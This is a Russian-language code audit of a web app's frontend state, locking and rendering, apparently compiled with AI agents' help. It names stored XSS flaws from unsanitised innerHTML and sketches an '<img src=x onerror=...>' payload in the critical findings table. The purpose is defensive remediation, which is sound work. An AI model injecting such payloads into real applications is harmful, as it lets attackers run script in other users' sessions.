# Фронт конструктора актов — полный аудит «как есть»

> **Назначение.** Глубокий, проверенный по коду срез фронта Act Constructor: что есть, что сломано, как чинить. Документ выдержан в дисциплине «evidence-first» — каждая находка содержит вырезку кода, конкретный пользовательский сценарий поломки, оценку эффорта и направление фикса.
>
> **Сравнение с предыдущей итерацией.** Этот документ заменяет первичный snapshot 2026-05 (~1427 строк). 10 параллельных агентов перепроверили все находки оригинала и нашли дополнительные. Подтверждено 41 / опровергнуто 4 / новых находок 51, в том числе **2 CRITICAL XSS, 2 CRITICAL ошибки потери данных и 3 CRITICAL бага в acts-manager**.
>
> **Скоуп.** `static/js/**`, `static/css/**`, `templates/**`, `app/**/routes/**`, `app/**/api/**` + backend-эндпоинты для cross-check контрактов фронт→бэк.
>
> **Метод.** 5 агентов перепроверили зоны 1-5/6 исходного аудита, 5 агентов покрыли непокрытые ранее аспекты (security, performance, css+a11y, admin/ck/error-handling, build/contracts). Каждая находка имеет confidence-маркер: **[HIGH]** — наблюдаемый факт в коде; **[MEDIUM]** — обоснованное подозрение, требует runtime-верификации; **[LOW]** — стилистика / гипотеза без воспроизведения.
>
> **Дата:** 2026-05-24. Ветка: `master` (HEAD `7ded1f0`). Working dir: `D:\PROJECT\Pyton\Act Constructor`.

---

## TL;DR — топ-15 находок (по severity)

### CRITICAL — фиксить немедленно

| # | Зона | Файл | Проблема |
|---|---|---|---|
| **C-XSS-1** | Security | `static/js/constructor/textblock/textblock-editor.js:27` | Stored XSS через `textBlock.content`: `editor.innerHTML = textBlock.content` без санитизации; бэк тоже не санитизирует. Любой аудитор может встроить `<img src=x onerror=...>` через DevTools — сработает у всех, кто откроет акт. |
| **C-XSS-2** | Security | `static/js/constructor/preview/preview-violation-renderer.js:183` | Stored XSS в preview-режиме: `line.innerHTML = ${label}: ${text}` без escape. Срабатывает **раньше C-XSS-1** — debounce 500 мс при каждом keystroke коллеги. |
| **C-PROXY** | State | `static/js/constructor/state/state-core.js:518-538` | `Object.defineProperty`-Proxy ловит только присвоения верхнего уровня. ~92 % мутаций (правки ячеек, nested writes в `tables[id].grid[r][c]`) **не помечают dirty**. Автосохранение и индикатор «не сохранено» не срабатывают. При закрытии вкладки между debounce-циклами данные теряются. |
| **C-RESTORE** | State | `static/js/constructor/storage-manager.js:100-167` | `StorageManager.restoreSavedState()` — **полностью мёртвый метод**, никем не вызывается. Восстановление из localStorage не работает; LS заполняется впустую (до 4 МБ). При crash вкладки/refresh данные из БД, локальные несохранённые правки теряются. |
| **C-PATCH×2** | Acts Manager | `static/js/portal/acts-manager/acts-manager-page.js:496-535` | Перехват `_closeDialog` в `editAct` приводит к **двойной отправке PATCH** при «Сохранить изменения». Флаг `_isSaving` устанавливается только внутри `safeClose`, основной submit-flow его не выставляет. Audit-log получает два события «save metadata», аудит-trail размывается. |
| **C-URL×2** | Acts Manager | `static/js/portal/acts-manager/dialog-create-act.js:1378` | Двойная обёртка `AppConfig.api.getUrl()`: формируется URL вида `https://hub/proxy/8000/https://hub/proxy/8000/api/v1/acts/create?force_new_part=true`. **Создание новой части при коллизии КМ сломано в любом окружении** (dev и JupyterHub). |
| **C-LOCK** | Acts Manager | `static/js/portal/acts-manager/version-preview.js:288-323` | `VersionPreviewOverlay._restore` делает свой `lockAct` + `unlockAct.catch(()=>{})` в finally. Это **снимает блокировку, которую держит `LockManager` родительского `AuditLogDialog`**. Через 1-2 минуты LockManager не сможет продлить → пользователь видит фейковое «Сессия завершена». |

### HIGH — следующий приоритет

| # | Зона | Файл | Проблема |
|---|---|---|---|
| **H-RENDERALL** | Архитектура | `static/js/constructor/items/items-renderer.js:13` | `ItemsRenderer.renderAll()` — монолитная перерисовка шага 2 на каждое микро-изменение. 14 call-sites, 11 из них узколокальные. На типичном акте ~1 635 DOM-мутаций + ~480 свежих listener'ов за вызов. Теряется фокус при правке violation textarea во время drag-drop в дереве — «правка одной сущности ломает соседа». |
| **H-SCRIPTS** | Performance | `templates/constructor/base_constructor.html` | 72 `<script>` без `defer`/`async` под HTTP/1.1 (cap=6) → 12 round-trips → **600-1200 мс «второго белого экрана»** на cold-load под JupyterHub. |
| **H-PREVIEW** | UX | `static/js/constructor/preview/preview.js`, `preview-menu.js:345` | `PreviewManager.update()` оборачивает в RAF, но не дедуплицирует — каждый input в полях нарушений = полный rebuild дерева preview (200-2000 createElement). Дополнительно: listener на `app:state-changed` **мёртв** (событие нигде не диспатчится). |
| **H-EXTEND** | State | `static/js/constructor/lock-manager.js:222-308` | Одна сетевая ошибка `_extendLock` (без retry) → принудительный `_initiateExit('extensionFailed')`. В нестабильной сети JupyterHub — потеря сессии без шансов. |
| **H-NAV** | State | `static/js/constructor/storage-manager.js:269-337` | Navigation interception перехватывает только клики по `<a href>`. Обходят: `window.location.href` (в lock-manager 3 раза), `history.pushState`, middle-click, form submit, popstate. Потеря несохранённых правок при программной навигации. |
| **H-HEADERS** | Security | `app/main.py`, `app/core/middleware.py` | Нет ни одного security-header (CSP, X-Frame-Options, HSTS, X-Content-Type-Options на HTML/JSON). Усиливает все XSS-вектора до full script-exec. |
| **H-BOUNDARY** | Error handling | глобально | Нет `window.onerror`/`unhandledrejection`. Любая необработанная ошибка JS → silent → юзер думает «кнопка не работает». Нет fetch timeout (AbortController нигде). 422-ответы FastAPI рендерятся как `[object Object]`. |
| **H-A11Y** | a11y | везде | Tree и Table — главные рабочие компоненты — **без ARIA и без keyboard navigation** (0 ArrowUp/Down handler'ов). Диалоги без focus-management/focus-trap/aria-modal. Notifications без aria-live. Скринридерам конструктор недоступен. |

Полная таблица всех 92 находок (CRITICAL/HIGH/MEDIUM/LOW/INFO) — в §15.

---

## Метод

10 параллельных read-only Explore-агентов:

**Группа A — верификация исходного аудита:**
- **VER-1** «Шаблоны + Shared» (§1 + §6 исходника)
- **VER-2** «State + Persistence» (§2)
- **VER-3** «Tree + Isolation» (§3 — ключевая зона)
- **VER-4** «UX shell» (§4)
- **VER-5** «Acts Manager» (§5)

**Группа B — новые аспекты:**
- **NEW-1** «Security» (XSS, CSRF, auth bypass, dead endpoints)
- **NEW-2** «Performance» (статический анализ + расчёты)
- **NEW-3** «CSS + a11y» (78 файлов, ARIA-покрытие)
- **NEW-4** «Admin/CK + Error handling»
- **NEW-5** «Build/deploy + Backend API contracts»

Все находки в формате: `[Severity]` файл:строка + 5-15 строк кода + bad-outcome scenario + effort estimate + fix direction + cross-links.

---

# Часть I. Карта и архитектура

## §1. Страницы, шаблоны и загрузка ассетов

### 1.1 Маршрутизация

| URL Pattern | Handler | Шаблон | Base Template | Query |
|---|---|---|---|---|
| `/` | `show_landing` (`app/routes/portal.py:26`) | `portal/landing/landing.html` | `portal/base_portal.html` | — |
| `/acts` | `show_acts_manager` (`app/domains/acts/routes/portal.py:15`) | `portal/acts-manager/acts_manager.html` | `portal/base_portal.html` | — |
| `/constructor` | `show_constructor` (`app/domains/acts/routes/constructor.py:27`) | `constructor/constructor.html` | `constructor/base_constructor.html` | `?act_id=<int>` (обязателен) |
| `/admin` | `show_admin_page` (`app/domains/admin/routes/portal.py:15`) | `portal/admin/admin.html` | `portal/base_portal.html` | — |
| `/ck-client-experience`, `/ck-fin-res` | (см. §11) | `portal/ck/ck_*.html` | `portal/base_portal.html` | — |

При отсутствии `act_id` или доступа к нему → 302 на `/acts`.

### 1.2 Иерархия шаблонов

**Конструктор:** `constructor.html` extends `base_constructor.html`. Header — 8 партиалов (chat_panel, help, save_indicator, steps, preview_button, acts_menu, settings_menu, exit_button). Content — tree_panel, preview_panel, context_menu. В `extra_js` подсасываются partials для invoice_dialog + 6 portal-партиалов (см. H2 ниже).

**Портал:** `landing|acts-manager|admin|ck/*.html` extends `base_portal.html` (sidebar, topbar, settings_menu, chat_content).

### 1.3 Порядок `<script>` (~72 файла, без `defer`)

Группы в `base_constructor.html`:
1. **Конфигурация и auth** (24-48) — `app-config.js`, `auth.js`, header-exit, inline-проверка auth.
2. **Базовые утилиты** — `notifications.js`, `changelog-tracker.js`, `storage-manager.js`, `api.js`, `app.js`, `navigation-manager.js`, `format-menu-manager.js`, `settings-menu.js`.
3. **Чат** (61-75) — 13 модулей в строгом порядке: `DOMPurify` → `chat-event-bus` (первым обязательно) → renderer → client-actions → stream → history → ui → files → title → context → messages → manager → chat-popup.
4. **Диалоги** (78-83) — dialog-base, dialog-confirm + **2 портальных** скрипта.
5. Дальше — context-menu / services / state / tree / items / table / preview / textblock / violation / validation / utilities.

Подробное содержимое каждой группы — было в §1.3 исходного документа (без изменений). Здесь зафиксированы только load-bearing нюансы.

### 1.4 CSS entry points

- **shared.css** — 14 импортов (base/variables, reset, animations + shared/buttons/notifications/dialog/chat).
- **constructor.css** — **41 @import** (`shared.css` + layout/tree/table/violation/preview/help/buttons/items/textblock/context-menu/dialog/chat-popup/utilities).
- **portal.css** — **15 @import** (`shared.css` + portal/layout/landing/acts-manager + dialog/acts-modal + cross-area `constructor/preview/*` + admin + ck).

### 1.5 Находки в §1

#### [HIGH] H2 — Дублирующие portal-партиалы в `base_constructor.html`
**Подтверждено** (VER-1).

**Файлы:** `templates/constructor/base_constructor.html:80-81` (scripts) + `155-160` (HTML partials).

```html
<!-- строки 80-81 — портальные JS-модули в конструкторе -->
<script src="{{ url_for('static', path='js/portal/acts-manager/team-member-search.js') }}"></script>
<script src="{{ url_for('static', path='js/portal/acts-manager/dialog-create-act.js') }}"></script>

<!-- строки 155-160 — портальные HTML-партиалы -->
{% include 'portal/acts-manager/components/create_act_dialog.html' %}
{% include 'portal/acts-manager/components/team_member_row.html' %}
{% include 'portal/acts-manager/components/directive_row.html' %}
{% include 'portal/acts-manager/components/acts_loading.html' %}      <!-- ←  не нужен в конструкторе -->
{% include 'portal/acts-manager/components/acts_empty_state.html' %}  <!-- ← не нужен -->
{% include 'portal/acts-manager/components/acts_error_state.html' %}  <!-- ← не нужен -->
```

Из 6 партиалов **реально нужны** только 3 (создание акта из header). 3 нижних — loading/empty/error для списка карточек, на конструкторе их быть не должно.

**Bad-outcome:** при открытии акта браузер дополнительно загружает 6 partial-`<template>`-блоков + 2 JS-модуля, нужных только в Управлении актами. На constructor-странице (и так перегружено 72 скриптами) — лишний парсинг ~600 строк HTML. Дополнительно: дубль `id="createNewActBtn"` между шапкой конструктора и `acts_manager.html` (см. N-DUP-ID ниже).

**Effort:** S / 3ч / 1 dev. Удалить 3 нижних include из `base_constructor.html` или вынести нужные в `templates/shared/dialogs/`.

**Cross-links:** N-DUP-ID, H10.

#### [HIGH] H12 — Hardcoded `/api/v1/chat/...` endpoints
**Подтверждено** (VER-1).

**Файлы:** 9 occurrences в 5 chat-модулях:
- `chat-context.js:101, 189, 229`
- `chat-history.js:52, 104, 143`
- `chat-stream.js:305, 448`
- `chat-files.js:83`
- `chat-renderer.js:753`

Все строки проходят через `AppConfig.api.getUrl(...)` корректно (т.е. **H11 опровергнут** — это не fallback на relative URL), но префикс `/api/v1/chat` рассыпан без константы.

**Bad-outcome:** при смене API-префикса (vNN / вынос chat в отдельный сервис) — править 9 строк в 5 файлах, риск пропустить.

**Effort:** S / 2ч. Завести в `AppConfig.api` константу `chatPrefix` или helper `chatUrl(suffix)`.

#### [MEDIUM] M1 — Жёсткий порядок чат-скриптов
**Подтверждено** (VER-1). 13 chat-script'ов с явными зависимостями (DOMPurify до chat-renderer, chat-event-bus первым, chat-stream до chat-messages для `ChatRateLimitedError`). Документирован комментариями, но без статической проверки. Перестановка по алфавиту → `Uncaught ReferenceError`.

**Effort:** M / 6ч. Pytest-снапшот `tests/test_template_script_order.py` парсит base*.html и валидирует инварианты.

#### [LOW] L1 — `errors.css` — orphan для entry
**Уточнено** (VER-1, NEW-3): файл подключается напрямую из `templates/shared/errors/base_error.html:7`, не orphan. Но не входит в `entry/shared.css`, значит error-страницы получают только `variables.css` + `reset.css`. Если `errors.css` использует переменные из `--*` — они окажутся undefined. **Не критично**, проверить spot-check.

#### [LOW] L2 — Дубли ck-шаблонов
**Подтверждено** (VER-1, NEW-4). `ck_fin_res.html` ≡ `ck_client_experience.html` на **95 %**, отличаются 4 строки (title, 2 path к page.js, init class). См. C1 в §11.

#### [LOW] L12 / L13 — DialogBase: ручной reflow + утечка Escape-handler
**Подтверждено** (VER-1).

```js
// dialog-base.js:40
overlay.offsetHeight;        // ← reflow без присваивания, линтер может удалить
overlay.classList.add('visible');
```

```js
// dialog-base.js:273-280 — closeAllDialogs НЕ удаляет _escapeHandler
static closeAllDialogs() {
    const dialogs = [...this._activeDialogs];
    dialogs.forEach(dialog => this._hideDialog(dialog, 0));   // ← не вызывает _removeEscapeHandler
    this._activeDialogs = [];
    this._unlockBodyScroll();
}
```

**Bad-outcome:** orphan listener'ы на `document` после `closeAllDialogs`. На long-running странице — десятки мёртвых handler'ов.

**Effort:** XS / 10 мин.

#### [MEDIUM] N-DUP-ID — Дубль `id="createNewActBtn"`
**Новая находка** (VER-1).

**Файлы:** `templates/constructor/header/header_acts_menu.html:23` и `templates/portal/acts-manager/acts_manager.html:15`.

На разных страницах элементы не сосуществуют → прямой коллизии нет. Но в будущем при рефакторинге кто-то может попытаться сделать общий handler и нарваться на «работает в одной странице, не работает в другой». Стандартная санитарная норма — уникальные id даже между шаблонами.

**Effort:** XS / 10 мин — `createNewActBtnConstructor` или `headerCreateNewActBtn`.

#### [LOW] N-BLOCK-3 — `KNOWN_BLOCK_TYPES` — третий источник истины
**Новая находка** (VER-1).

CLAUDE.md правило «новые типы блоков чата добавлять в **двух** местах» (Python `MessageBlock` + `_DiscriminatedBlock`) **неточно**. Фронт `static/js/shared/chat/chat-messages.js:17-27` имеет третий whitelist `KNOWN_BLOCK_TYPES` (Set). Молчаливый забыв пропустит ревью.

**Fix:** обновить CLAUDE.md «Новый тип блока чата — три места: MessageBlock + _DiscriminatedBlock + KNOWN_BLOCK_TYPES»; долгосрочно — codegen whitelist'а из Python.

---

## §2. Состояние, persistence и lifecycle акта

### 2.1 Жизненный цикл

DOMContentLoaded → `App.init()` → `AppState.initializeTree(true)` + `StorageManager.init()` → `ActsMenuManager` (`?act_id` → `_autoLoadAct`) → `LockManager.init(actId)` (POST `/lock`, 409 → диалог + redirect) → `APIClient.loadActContent(actId)` → `restoreSavedState()` (теоретически — но см. C-RESTORE) → `_initStateTracking()` (Proxy на верхних полях AppState).

### 2.2 AppState

Объект-литерал, проксируемые поля: `treeData`, `tables`, `textBlocks`, `violations`, `tableUISizes`, `currentStep`, `selectedNode`, `selectedCells`. Methods: `initializeTree`, `findNodeById`, `findParentNode`, `exportData`, `addTableToNode/removeTable/addNode/deleteNode/moveNode`, `generateNumbering`.

Helpers: `disableTracking()` / `enableTracking()` / `withoutTracking(fn)` — для loadActContent/restore/saveActContent.

### 2.3 StorageManager

Два независимых флага:
- `_hasUnsavedChanges` (память → LS)
- `_isSyncedWithDB` (LS → БД)

Состояния save-indicator: красный (unsaved) / жёлтый (local-only) / белый (saved).

Таймеры: debounce 1 сек (LS write), periodic LS 2 мин, periodic DB 2 мин.

Перехват навигации: `beforeunload` + клики по `a[href]` (см. H-NAV).

### 2.4 LockManager

Init → POST `/lock` (409 → редирект) → activity-tracking listeners → inactivity-check interval → auto-extend каждые 30 сек.

Defaults: `lockDurationMinutes:30`, `inactivityTimeoutMinutes:5`, `inactivityCheckIntervalSeconds:30`, `minExtensionIntervalMinutes:5`, `inactivityDialogTimeoutSeconds:30`.

### 2.5 ChangelogTracker

`act_changelog_${actId}` (префиксован, см. N-LS-PREFIX). In-memory массив `_entries` (max 500). `flush()` уносит записи в PUT `/content`.

### 2.6 API-эндпоинты, дёргаемые фронтом (зона state)

Полный inventory — в §14.

### 2.7 Находки в §2

#### [CRITICAL] C-PROXY — Proxy ловит только верхний уровень присвоений
**Новая находка** (VER-2).

**Файл:** `static/js/constructor/state/state-core.js:518-538`.

```js
trackedProperties.forEach(prop => {
    let internalValue = AppState[prop];
    Object.defineProperty(AppState, prop, {
        get() { return internalValue; },
        set(newValue) {                  // ← СРАБАТЫВАЕТ ТОЛЬКО ЗДЕСЬ
            internalValue = newValue;
            StorageManager.markAsUnsaved();
        },
        enumerable: true, configurable: true
    });
});
```

Все nested-мутации обходят `defineProperty`:
- `AppState.tables[tableId].grid[r][c].content = 'edit'` — **НЕ помечает state**
- `AppState.tables[tableId] = newTable` — это присвоение в КЛЮЧ объекта, defineProperty на `tables` **не срабатывает** (срабатывает только `AppState.tables = {}`).

**Подсчёт ручных `markAsUnsaved()` в боевом коде:** 5 вызовов. Реальных мутаций nested-полей: **~65+** в `table-cells-operations.js`, `state-content.js`, `state-tree.js`, `dialog-violation.js`. **Покрытие ~7-8 %.**

Реальный сценарий: пользователь правит 50 ячеек подряд:
1. Ни один edit не помечает state.
2. Если **не кликает по дереву / не делает select** (то, что Proxy реально ловит) → таймер дебаунса не запускается.
3. Закрывает вкладку → `beforeunload` проверяет `if (_hasUnsavedChanges)` → false → **тихо закрывается, данные теряются.**
4. Периодические интервалы 2 мин тоже проверяют тот же флаг → не сработают.

**Эффективно автосохранение не работает при правке только ячеек.** То, что мы пока не наблюдаем массовых жалоб — заслуга случайных кликов по дереву/выделений, которые «фоном» поднимают флаг.

**Effort:** L / 16-24ч.
**Fix:**
- Краткосрочно — добавить ручные `StorageManager.markAsUnsaved()` после ВСЕХ операций мутации в `state-content.js` (~30 мест), `state-tree.js` (~20 мест), `table-cells-operations.js`, `dialog-violation.js`.
- Долгосрочно — recursive Proxy с handler `{ set(target, prop, value) { ... markAsUnsaved(); ... } }`.

**Cross-links:** C-RESTORE, H-NAV, M2.

#### [CRITICAL] C-RESTORE — `restoreSavedState()` мёртвый метод
**Новая находка** (VER-2).

**Файл:** `static/js/constructor/storage-manager.js:96-167` (68 строк) + связанный `_restoreSelectedFormats` (489-502), `_updateStepUI` (192-219).

Документирован как «вызывается явно из ActsMenuManager».

```bash
grep -rn "restoreSavedState\|StorageManager\.restore" static/ app/ templates/
# Единственный hit — само определение в storage-manager.js:100
```

**Bad-outcome:**
- Восстановление состояния из localStorage никогда не выполняется.
- localStorage заполняется данными (до 4 МБ) — данные накапливаются «вечно».
- При refresh страницы → `_autoLoadAct` → `APIClient.loadActContent` (из БД, локальное состояние игнорируется).
- При offline или ошибке загрузки из БД — **нет fallback на локальное хранилище**.

68 строк мёртвого кода + два зависимых метода тоже мёртвые.

**Effort:** S / 2ч.
**Fix:** либо удалить метод и связанный код (если БД — единственный источник истины), либо вызывать `restoreSavedState()` как fallback при `catch` блока `api.js:442-446`.

#### [HIGH] H4 — Activity-listeners в LockManager без removeEventListener
**Подтверждено** (VER-2).

**Файл:** `static/js/constructor/lock-manager.js:261-267`.

```js
static _setupActivityTracking() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    const updateActivity = () => (this._lastActivity = Date.now());
    events.forEach(event =>
        document.addEventListener(event, updateActivity, {passive: true})
    );
}
```

`LockManager.destroy()` (вызывается из `manualUnlock`, `_initiateExit`, switch актов в `acts-menu.js:332`) **не снимает** эти 4 listener'а. На single-act flow утечка не наблюдается (singleton LockManager), но при switch на другой акт без перезагрузки страницы — N×listener'ов накапливается.

**Effort:** S / 1ч. Сохранить `this._activityHandler`, в `destroy()` сделать `events.forEach(e => document.removeEventListener(e, this._activityHandler))`.

#### [HIGH] H-EXTEND — Одна неудачная попытка extend → принудительный выход
**Новая находка** (VER-2).

**Файл:** `static/js/constructor/lock-manager.js:222-308`.

```js
static async _extendLock() {
    ...
    if (!response.ok) throw new Error('Не удалось продлить блокировку');
}

const ok = await this._extendLockSafely();
if (!ok) {
    console.error('Автопродление не удалось → выход');
    this._initiateExit('extensionFailed');   // ← мгновенный logout
}
```

**Bad-outcome:** в JupyterHub-окружении (Kerberos, proxy, нестабильная сеть) короткий network glitch на момент периодической проверки = принудительный logout с потерей сессии. Никакого retry, никакого «X неудач подряд».

**Effort:** M / 4ч. Счётчик `_extensionFailures`, инициировать exit только после `MAX_FAILURES=3` подряд. Сбрасывать при успехе. Логировать.

#### [HIGH] H-NAV — Несимметричный navigation interception
**Новая находка** (VER-2).

**Файл:** `static/js/constructor/storage-manager.js:269-337`.

Перехватываются ТОЛЬКО клики по `<a href>` same-origin, не `_blank`. Обходят защиту:
1. `window.location.href = ...` (`lock-manager.js:181, 201, 517`, `acts-menu.js:533`)
2. `history.pushState`/`replaceState` (`acts-menu.js:364`)
3. Middle-click / Ctrl+click
4. Form submit
5. browser back/forward (popstate) — НЕ перехватывается

Особенно опасно #1 и #5 — реальные пути в коде проекта.

**Effort:** M / 4ч. `beforeunload` как safety net (уже есть, но условный); явный `confirmNavigation()` helper вместо прямых `window.location.href`; popstate handler.

#### [HIGH] N5 — Двойной PUT /content при exit
**Новая находка** (VER-2).

**Файлы:** `static/js/constructor/header/header-exit.js:74-82`, `lock-manager.js:438-519`.

`header-exit.js:77` ВРУЧНУЮ дёргает `APIClient.saveActContent(saveType:'manual')` (с `changelog = ChangelogTracker.flush()`). Затем `LockManager._initiateExit` запускает свой `PUT /content` (`lock-manager.js:463`) с уже пустым changelog (флушнут). **Двойной запрос, второй не атомарен относительно unlock.**

**Effort:** S / 2ч. Либо header-exit делегирует LockManager, либо LockManager._initiateExit проверяет `hasUnsyncedChanges()` перед своим PUT.

#### [MEDIUM] H3 — Гонка LS между вкладками (понижено)
**Уточнено** (VER-2): фактически смягчена тем, что для одного акта есть lock; гонка реальна между вкладками без открытого акта (LS-ключи `audit_workstation_state`, `constructor_current_step`, `constructor_scroll_positions` — без префикса actId).

#### [MEDIUM] N-LS-PREFIX — LS-ключи без префикса actId
**Новая находка** (VER-2).

Глобальные ключи (без actId-префикса):
- `audit_workstation_state`
- `audit_workstation_timestamp`
- `constructor_current_step`
- `constructor_scroll_positions`

**Bad-outcome:** read-only пользователь открывает две вкладки на разные акты в режиме просмотра (lock не требуется), скролл и шаг «пляшут» между вкладками.

**Effort:** M / 4ч. Префикс actId везде где данные акт-специфичны. Либо `sessionStorage` (per-tab).

#### [MEDIUM] M3 — Несимметричные beforeunload
**Подтверждено** (VER-2). 3 разных подхода к одному API (`app.js:243`, `storage-manager.js:227`, `lock-manager.js:328`). Только LockManager имеет `disableBeforeUnload()`. При программном выходе scroll-positions и storage-manager handler всё равно выполняются.

#### [MEDIUM] N7 — Race между _autoLoadAct и _initStateTracking
**Новая находка** (VER-2).

`state-core.js:563-571` оборачивает Proxy в `setTimeout(0)`. `ActsMenuManager.init()` (DOMContentLoaded) синхронно запускает `_autoLoadAct(actId)` (async). Порядок относительно тиков loadActContent не гарантирован → Proxy может инициализироваться ДО или ПОСЛЕ `disableTracking()` в `api.js:351`.

**Effort:** M / 4ч. Сделать `App.init()` или `ActsMenuManager.init()` единой entry-point с детерминированным порядком: wrap → disable → autoLoad → enable. Убрать `setTimeout(0)` из state-core.

#### [MEDIUM] N8 — ChangelogTracker без destroy при switch актов
**Новая находка** (VER-2). Pending `_debounceTimers` на момент `init(newActId)` срабатывают и пишут с **новым** storageKey, но с `op/id/name` от **старого** акта — поломанный аудит.

**Effort:** S / 2ч. `static destroy()` очищает таймеры и `_entries`, вызывать перед `init(newActId)`.

#### [MEDIUM] M11 — Read-only disabled vs save-indicator
**Подтверждено** (VER-2). `app.js:303-307` ставит `disabled=true`, но `storage-manager.js:672, 678` (_updateSaveIndicator) ставит `disabled=false` в ветках 'unsaved'/'local-only'. В read-only кнопка визуально кликабельна → warning spam.

**Effort:** S / 1ч. В `_updateSaveIndicator` в начале — `if (isReadOnly) { button.disabled = true; return; }`.

#### Опровергнутые в §2

- **L4** (`APIClient.loadActContentRaw()` мёртвый) — **опровергнуто**: используется в `version-preview.js:127` для diff-сравнения версий. `checkReadOnlyMode()` (api.js:819) действительно мёртв.
- **L5** (после refresh жёлтый индикатор) — **опровергнуто**: текущий flow ставит белый (`init` дефолт `_isSyncedWithDB=true`, `loadActContent` сохраняет в LS с `_markAsSaved`).

#### Карта таймеров/интервалов (выдержка)

| Источник | Период | Cleanup в destroy |
|---|---|---|
| StorageManager debounce | 1c | да |
| StorageManager periodic LS | 120c | да |
| StorageManager periodic DB | 120c | да |
| LockManager inactivity-check | configurable | да |
| LockManager auto-extend | 30c | да |
| LockManager dialog countdown | configurable | да |
| ChangelogTracker debounce | 5c | при flush |
| ChangelogTracker _persistTimer | 1c | при новом вызове |
| api.js enableTracking (3 места) | 100/500мс | НЕТ |
| acts-menu.js redirect | 1500мс | НЕТ |
| state-core.js _initStateTracking | 0мс | НЕТ |

#### Window-глобалы и lifecycle

| Глобал | Где устанавливается | Cleanup |
|---|---|---|
| `window.currentActId` | acts-menu.js:362, 540 | **НЕТ** (никогда не сбрасывается в null) |
| `window.actMetadata` | api.js:331 | НЕТ |
| `window.ActsMenuManager` | acts-menu.js:612 | НЕТ |
| `window.LockManager` | lock-manager.js:522 | НЕТ |
| `window._allowNavigation` | storage-manager.js:274, 333 | reset в handler |

**Замечание:** `window.currentActId` после `deleteAct` (acts-menu.js:522) остаётся со старым ID до завершения redirect (1500 мс). В это окно периодические автосохранения могут пытаться писать на удалённый акт → 404.

---

## §3. Дерево, ноды, изоляция сущностей (ключевая зона)

> Это ответ на главный вопрос пользователя: «насколько каждая сущность изолирована, не ломает ли правка одной соседей».

### 3.1 Архитектурный вердикт

- **Изоляция данных: HIGH.** `TextBlockManager` пишет только в `AppState.textBlocks[id]`, `ViolationManager` — только в свой violation-объект (по замыканию), `TableManager` — только в `AppState.tables[id]` и `tableUISizes[id]`. **Реальных пересечений по записи между «соседями» нет** (grep `AppState\.` в `violation/` даёт 0 матчей, в `textblock/` — 1 read-only).
- **Изоляция рендера: LOW.** Любая структурная операция → `ItemsRenderer.renderAll()`, который стирает `#itemsContainer` и пересоздаёт все блоки всех сущностей. Это и есть «правка одной сущности задевает соседей» — не данные, а DOM/focus/IME/selection.

**Главная UX-катастрофа:** правка violation textarea теряет фокус при drag-drop в дереве. Юзер пишет нарушение → коллега перетягивает узел → его textarea пересоздаётся → введённый текст исчезает.

### 3.2 Таксономия нод

| Тип | Константа в AppConfig.nodeTypes | Назначение |
|---|---|---|
| `item` | ITEM | Структурные пункты/разделы |
| `table` | TABLE | Таблицы (обычные, метрики, риски) |
| `textblock` | TEXTBLOCK | Текстовые блоки с форматированием |
| `violation` | VIOLATION | Нарушения (нарушено/установлено) |

Иерархия: root → 5 защищённых секций (level 1) → item'ы level 2-4 (maxDepth=4) → leaf-узлы (table/textblock/violation без children).

### 3.3 H1 — `ItemsRenderer.renderAll()` — глубокий аудит

**Подтверждено и расширено** (VER-3 + NEW-2).

#### 3.3.1 Все call-sites — точно 14

| # | Файл:строка | Триггер | Что реально изменилось | Per-node замена | Сложность |
|---|---|---|---|---|---|
| 1 | `app.js:224` | переключение на Шаг 2 | первый рендер | НЕТ — первичный | — |
| 2 | `storage-manager.js:215` | restore из LS | весь treeData | НЕТ — стейт пришёл целиком | — |
| 3 | `shared/api.js:415` | load акта с сервера | весь акт | НЕТ — стейт пришёл целиком | — |
| 4 | `tree/tree-drag-drop.js:323` | handleDrop после moveNode | 1-2 родителя | **ДА** — updateNode(oldParent) + updateNode(newParent) | M |
| 5 | `context-menu/context-menu-tree.js:409` | add/delete node/table/textblock/violation | один новый/удалённый узел | **ДА** — insertNode/removeNode | M |
| 6 | `context-menu/context-menu-cells.js:785` | restoreTableSizes после операции с ячейками | контент одной таблицы | **ДА** — `renderSingleTable(tableId)` уже существует | S |
| 7 | `table/table-cells-operations.js:166` | insertRowAbove | grid одной таблицы | **ДА** | S |
| 8 | `table-cells-operations.js:242` | insertRowBelow | grid одной таблицы | **ДА** | S |
| 9-14 | `table-cells-operations.js:359, 446, 508, 572, 805, 870` | insertCol*, deleteCol, deleteRow, paste, edit, mergeCells, unmergeCells | grid одной таблицы | **ДА** | S |

**Итого: 14 вызовов, 11 (4-14) — потенциально per-node. 8 из 11 — операции над одной таблицей**, для которых **уже существует `renderSingleTable(tableId)` (items-renderer.js:610), но не используется.**

#### 3.3.2 Масштаб операции на один renderAll

Для типичного акта (~100 item-нод, ~100 ячеек в таблицах, ~10 textblocks, ~5 violations):

| Действие | Операций |
|---|---|
| DOM-нод стирается/пересоздаётся | **~1 635** (createElement + appendChild + dataset) |
| addEventListener (свежие, на новых узлах) | **~480** (3 на ячейку × 100 + 80 column resize + 100 row resize) |
| setupTitleEditing closures | **~80** (~16 КБ GC pressure) |

**Расчётная стоимость:** 15-40 мс на типичном акте, 80-200 мс на большом (300 нод / 500 ячеек) — это **видимый jank**.

#### 3.3.3 Side-effects

1. **Теряется фокус** в активном editor'е (главный UX-баг).
2. **Теряется выделение ячеек** (clearSelection() явно).
3. **Сбрасываются IME-состояния** — для русского ввода composition прерывается.
4. **Persisted column widths не теряются** (восстанавливаются через `_restoreTableSizes`), но между renderAll и setTimeout(0) видны «прыжки».

#### 3.3.4 Per-node API — draft

```js
ItemsRenderer.updateNode(nodeId)        // частичный rerender одного узла
ItemsRenderer.removeNode(nodeId)
ItemsRenderer.insertNode(parentId, nodeId)
ItemsRenderer.renderSingleTable(tableId)  // уже существует
```

Плюс `TableManager.attachEventListenersWithin(rootEl)` — версия `attachEventListeners()` ограниченная поддеревом.

**Минимально-инвазивный первый шаг (S, 1 день):** заменить 8 call-sites в `table-cells-operations.js` на `ItemsRenderer.renderSingleTable(tableId)`. Метод уже существует. Это сразу убирает **57 % (8/14) полных renderAll**.

### 3.4 Карта изоляции данных

| Компонент | Reads | Writes | Пересечения |
|---|---|---|---|
| TextBlockManager | `AppState.textBlocks[id]` | `textBlock.content` | **НЕТ.** Никаких записей в tables/violations/treeData. |
| ViolationManager | violation-объект (по замыканию) | violation.{violated, established, descriptionList.items, reasons, consequences, responsible, recommendations, additionalContent}.* | **НЕТ.** Идеальная изоляция данных. |
